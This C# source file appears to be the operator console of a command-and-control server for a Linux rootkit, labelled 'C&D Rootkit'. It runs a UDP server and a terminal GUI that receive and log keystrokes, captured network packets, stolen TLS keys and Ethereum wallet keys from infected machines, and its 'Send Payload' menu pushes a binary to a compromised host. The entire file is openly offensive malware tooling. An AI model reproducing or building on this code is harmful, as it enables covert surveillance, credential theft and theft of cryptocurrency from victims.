using Terminal.Gui;
using Figgle;
using System.Net;
using System.Globalization;
using System.Text;
namespace Command_and_Control_C_;
class Program
{

    // GUI
    static private Window window;

    //KeyLogger Window
    static private List<string> keysList = new List<string>();
    static private ListView realkeysListView = new ListView();

    //Info Window
    static private  List<string> infoList = new List<string>();
    static private ListView infoListView = new ListView();

    static private  List<string> ethereumList = new List<string>();
    static private ListView ethereumListView = new ListView();
    

    static private  List<string> networkList = new List<string>();
    static private ListView networkListView = new ListView();
    static private ListView keysListView = new ListView();
    static private  List<string> keysTLSList = new List<string>();
    static private Network net;
    static private Files file;

    static void Main(string[] args)
    {
        Console.WriteLine(Figgle.FiggleFonts.Standard.Render("C&D Rootkit"));
        Thread.Sleep(1 * 1000);  
        configServer(); /* Configure udp server to receive rootkit data */
        file = new Files(); /* File objets for write in .txt files */
        configGui(); /* Config GUI */
  
    }

    public static void configServer(){
        net = new Network();
        net.startServer();
        /* All events from network server for update GUI and write in file */
        net.eventLog+=logRecive;
        net.eventRealmTimeKey+=keyRecive;
        net.eventSkb+=skbRecive;
        net.eventSslHttps+=sslRecive;
        net.eventetheretumKey+=ethereumRecive;
        net.eventetsendOK+=sendOK;
    }

    public static void configGui()
    {
         Application.Init();
            window = new Window("C&D Rootkit"){
                X = 0,
                Y = 1, // Leave one row for the toplevel menu
                // By using Dim.Fill(), it will automatically resize without manual intervention
                Width = Dim.Fill(),
                Height = Dim.Fill()
            };

            var label = new Label ("C&D Rootkit") {
                        X = Pos.Center (),
                        Y = Pos.Center (),
                        Height = 1,
                    };

            window.Add(label);
            infoWindow(); /* Add info PupUp*/
            keyloggerWindow(); /* Add Keylogge Window */
            netWorkWindow(); /* Add Network Window */
            ethereumWindow(); /* Add Ethereum Window */
            menuBar(); /* Add menu bar (top) */
            statusBar(); /* Add status bar (bottom) */
            
            Application.Top.Add(window);
            Application.Run();
    }
    private static void menuBar(){
        var menu = new MenuBar (new MenuBarItem [] {
        new MenuBarItem ("Options", new MenuItem [] {
        new MenuItem ("About", "", () => { 
            about();
        ;}),
        new MenuItem ("Send Payload", "", () => { 
            fileDialog();
        ;}),
        new MenuItem ("Quit", "", () => { 
            Application.Shutdown();
            Environment.Exit(0);
            ;})}),

        /*
        new MenuBarItem ("Commands",new MenuItem []{
            new MenuItem("Test","TEST HELP",() => {
                about();
            ;})
        })*/    
            
            
            });
            
        Application.Top.Add(menu);
        }
    private static void statusBar(){
            var statusBar = new StatusBar() { Visible = true };
        statusBar.Items = new StatusItem[]
        {
            new (Key.Q | Key.CtrlMask, "~CTRL-Q~ Quit", () =>
            {Application.Shutdown();Environment.Exit(0); }),
            new (Key.P | Key.CtrlMask, "~CTRL-P~ Send Payload", () =>
            { fileDialog(); }),
            new (Key.E | Key.CtrlMask, "~CTRL-E~ Local IP", () =>
            {
                var cancel = new Button(0, 0, "Cancel");
                cancel.Clicked += () => Application.RequestStop();
                var dialog = new Dialog ("IP", 40, 10);
                var label = new Label (Dns.GetHostByName(Dns.GetHostName()).AddressList[1].ToString()) {
                    X = Pos.Center (),
                    Y = Pos.Center (),
                    Height = 1,
                };
                cancel.X = 14;
                cancel.Y = 5;
                dialog.Add(cancel);
                dialog.Add(label);
            
                Application.Run(dialog);
                }),
        };
        Application.Top.Add(statusBar);
    }
    private static void fileDialog()
    {
        var aTypes = new List<string> () { ".o;.bin;.exe;.*", ".o", ".exe", ".*" };
        var d = new OpenDialog ("Open payload", "Choose the path where to open the payload.", aTypes) { AllowsMultipleSelection = false };
		Application.Run (d);
        if (!d.Canceled && d.FilePaths.Count > 0) {
			String _fileName = d.FilePaths [0];
            net.sendPayload(_fileName);
		}
    }
    private static void about()
    {
        String txt = "C&D for Linux Rootkit\nInterrupt_Request";
        var n = MessageBox.Query (50, 5, "About", txt, "Ok");
    }
    
    /* Update data in GUI */
    public static void updateKeylogger(String x)
    {
        Application.MainLoop.Invoke(()=>{
                keysList.Add(x); /* Add element to list */
                realkeysListView.SetSource(keysList);
                realkeysListView.Width = Dim.Fill();
                realkeysListView.Height = keysList.Count;
                realkeysListView.ScrollDown(keysList.Count-15);

                /*
                keysListBuff.Add(x);
                keysListView.SetSource(keysListBuff);
                keysListView.Width = Dim.Fill();
                keysListView.Height = keysListBuff.Count;
                */
                });
                
    }

    private static void keyloggerWindow()
    {
        Window keyLoggerWindow = new Window("Keylogger"){
            X = 0,
            Y = 51, // Leave one row for the toplevel menu
            // By using Dim.Fill(), it will automatically resize without manual intervention
            Width = 50,
            Height = 20
        };

        //ListView realkeysListView = new ListView();
            realkeysListView.SetSource(keysList);
            realkeysListView.Width = Dim.Fill();
            realkeysListView.Height = keysList.Count;

        var realTimeKeyLoggerFrame = new FrameView("RealTimeKeyLogger")
        {
            X = 0,
            Y = 1,
            Width = Dim.Fill(),
            //Height = Dim.Percent(49),
            Height=Dim.Fill()
        };

        realTimeKeyLoggerFrame.Add(realkeysListView);
        keyLoggerWindow.Add(realTimeKeyLoggerFrame);

        /*
        //var keysListView = new ListView();
            keysListView.SetSource(keysListBuff);
            keysListView.Width = Dim.Fill();
            keysListView.Height = keysList.Count;
        
        var KeyLoggerFrame = new FrameView("BufferKeyLogger")
        {
            X = 0,
            Y = 10,
            Width = Dim.Fill(),
            Height = Dim.Percent(49),
        };

        KeyLoggerFrame.Add(keysListView);
        keyLoggerWindow.Add(KeyLoggerFrame);
        */

        window.Add(keyLoggerWindow);
    }

/* Update data in GUI */
    public static void updateInfo(String x){
        Application.MainLoop.Invoke(()=>{
        infoList.Add(x);
        infoListView.SetSource(infoList);
        infoListView.Width = Dim.Fill();
        infoListView.Height = infoList.Count;
        infoListView.ScrollDown(infoList.Count-17);
                });
    }
    private static void infoWindow()
    {
        Window keyLoggerWindow = new Window("Info/Logs"){
            X = 0,
            Y = 1, // Leave one row for the toplevel menu
            // By using Dim.Fill(), it will automatically resize without manual intervention
            Width = 70,
            Height = 20
        };

        //var realkeysListView = new ListView();
            infoListView.SetSource(keysList);
            infoListView.Width = Dim.Fill();
            infoListView.Height = keysList.Count;

        keyLoggerWindow.Add(infoListView);
        window.Add(keyLoggerWindow);

    }

    private static void ethereumWindow()
    {
        Window keyLoggerWindow = new Window("Ethereum walley Key"){
            X = 40,
            Y = 40, // Leave one row for the toplevel menu
            // By using Dim.Fill(), it will automatically resize without manual intervention
            Width = 55,
            Height = 5
        };

        //var realkeysListView = new ListView();
            ethereumListView.SetSource(ethereumList);
            ethereumListView.Width = Dim.Fill();
            ethereumListView.Height = ethereumList.Count;

        keyLoggerWindow.Add(ethereumListView);
        window.Add(keyLoggerWindow);

    }

/* Update data in GUI */
    public static void updateNetwork(String x){
        Application.MainLoop.Invoke(()=>{
        networkList.Add(x);
        networkListView.SetSource(networkList);
        networkListView.Width = Dim.Fill();
        networkListView.Height = networkList.Count;
        networkListView.ScrollDown(networkList.Count-17);
                });
    }

/* Update data in GUI */
    public static void updateSslKeys(String keys){
        Application.MainLoop.Invoke(()=>{
        keysTLSList.Add(keys);
        keysListView.SetSource(keysTLSList);
        keysListView.Width = Dim.Fill();
        keysListView.Height = keysTLSList.Count;
        keysListView.ScrollDown(keysTLSList.Count-3);
                });
    }

/* Update data in GUI */
    public static void updateEthereumKey(String keys){
        Application.MainLoop.Invoke(()=>{
        ethereumList.Add(keys);
        ethereumListView.SetSource(ethereumList);
        ethereumListView.Width = Dim.Fill();
        ethereumListView.Height = ethereumList.Count;
        ethereumListView.ScrollDown(ethereumList.Count-3);
                });
    }


    private static void netWorkWindow()
    {
        Window netWorkWindow = new Window("Network"){
            X = 101,
            Y = 1, // Leave one row for the toplevel menu
            // By using Dim.Fill(), it will automatically resize without manual intervention
            Width = 50,
            Height = 40
        };

        networkListView.SetSource(networkList);
            networkListView.Width = Dim.Fill();
            networkListView.Height = networkList.Count;

        var realTimeKeyLoggerFrame = new FrameView("Network Packages")
        {
            X = 0,
            Y = 1,
            Width = Dim.Fill(),
            Height = Dim.Percent(70),
        };

        realTimeKeyLoggerFrame.Add(networkListView);

        keysListView.SetSource(keysTLSList);
            keysListView.Width = Dim.Fill();
            keysListView.Height = keysTLSList.Count;

        var KeyLoggerFrame = new FrameView("SSL Keys")
        {
            X = 0,
            Y = 27,
            Width = Dim.Fill(),
            Height = Dim.Percent(30),
        };

        KeyLoggerFrame.Add(keysListView);

        netWorkWindow.Add(realTimeKeyLoggerFrame);
        netWorkWindow.Add(KeyLoggerFrame);

        window.Add(netWorkWindow);

    }
    
    /* Callback for keylogger*/
    public static void keyRecive(string key)
    {
        DateTime localDate = DateTime.Now;
        var culture = new CultureInfo("en-GB");
        String x = localDate.ToString(culture) + " " + key;
        updateKeylogger(x);
        file.writeKeylogger(x);
    }

/* Callback for log*/
    public static void logRecive(string log)
    {
        DateTime localDate = DateTime.Now;
        var culture = new CultureInfo("en-GB");
        String x = localDate.ToString(culture) + " " + log;
        updateInfo(x);
        file.writeLog(x);
    }


/* Callback for networkpacket*/
    public static void skbRecive(StringBuilder sb){
        string[] delim = { Environment.NewLine, "\n" }; // "\n" added in case you manually appended a newline
        string[] lines = sb.ToString().Split(delim, StringSplitOptions.None);
        foreach(string line in lines){
            updateNetwork(line);
        }
        file.writeSKB(sb);
    }

/* Callback for SSLKeys*/
    public static void sslRecive(String key)
    {
        updateSslKeys(key);
        file.writeSslKeys(key);
    }

/* Callback for ethereum wallet*/
    public static void ethereumRecive(String key)
    {
        updateEthereumKey(key);
        file.writeEthereumKey(key);
    }

/* Callback for ok sended payload*/
    public static void sendOK(int bytes){
        Application.MainLoop.Invoke(()=>{
                    String txt = "Sended: " + bytes + " bytes";
        var n = MessageBox.Query (50, 5, "Send Payload", txt, "Ok");
        });
    }

}
